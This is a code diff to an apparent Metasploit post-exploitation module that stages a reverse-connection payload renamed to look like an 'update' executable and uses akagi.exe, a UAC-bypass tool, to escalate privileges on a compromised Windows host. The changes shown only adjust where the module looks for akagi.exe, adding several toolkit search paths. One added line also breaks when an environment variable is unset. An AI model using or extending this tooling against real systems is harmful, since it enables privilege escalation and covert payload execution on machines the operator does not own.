@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Post
       [
         OptString.new('LHOST', [ true, 'Listener IP for payload', '0.0.0.0' ]),
         OptInt.new('LPORT', [ true, 'Listener port for payload', 4445 ]),
-        OptString.new('AKAGI_PATH', [ false, 'Path to akagi.exe on attacker', '/home/giovi/akagi.exe' ]),
+        OptString.new('AKAGI_PATH', [ false, 'Path to akagi.exe on attacker', '' ]),
         OptString.new('PAYLOAD_NAME', [ false, 'Custom payload name (random if empty)', '' ])
       ])
   end
@@ -74,18 +74,29 @@ class MetasploitModule < Msf::Post
 
     print_good("Copied #{existing_payload} -> /tmp/#{payload_name}")
 
-    # Get akagi.exe path
+    # Get akagi.exe path - try multiple locations including env var
     akagi_local = datastore['AKAGI_PATH']
-    unless ::File.exist?(akagi_local)
-      print_error("akagi.exe not found at #{akagi_local}")
-      print_error("Set AKAGI_PATH option or place akagi.exe at default location")
+    if akagi_local.empty?
+      # Try default locations
+      ['/home/giovi/akagi.exe', '/root/.local/share/acheron-toolkit/bin/akagi.exe', 
+       ENV['ACHERON_TOOLKIT_DIR'] + '/bin/akagi.exe', 
+       ENV['HOME'] + '/.local/share/acheron-toolkit/bin/akagi.exe'].each do |path|
+        if ::File.exist?(path)
+          akagi_local = path
+          break
+        end
+      end
+    end
+    
+    unless akagi_local && ::File.exist?(akagi_local)
+      print_error("akagi.exe not found! Set AKAGI_PATH option or place at default location.")
       return
     end
     
     print_status("Using akagi.exe from #{akagi_local}")
     print_status("File size: #{::File.size(akagi_local)} bytes")
 
-    # COPY and RENAME the existing payload (again for local copy)
+    # COPY and RENAME the existing payload
     payload_name = datastore['PAYLOAD_NAME'].empty? ? "update_#{Time.now.to_i}_#{rand(1000..9999)}.exe" : datastore['PAYLOAD_NAME']
     print_status("Copying existing payload to #{payload_name}...")
     ::FileUtils.cp(existing_payload, "/tmp/#{payload_name}")
@@ -162,6 +173,7 @@ class MetasploitModule < Msf::Post
     search_paths = [
       ENV['ACHERON_TOOLKIT_DIR'] || '/root/acheron-toolkit/',
       ENV['HOME'] + '/acheron-toolkit/',
+      ENV['HOME'] + '/.local/share/acheron-toolkit/',
       '/tmp/acheron-gen/',
       ENV['HOME'] + '/',
       '/root/',
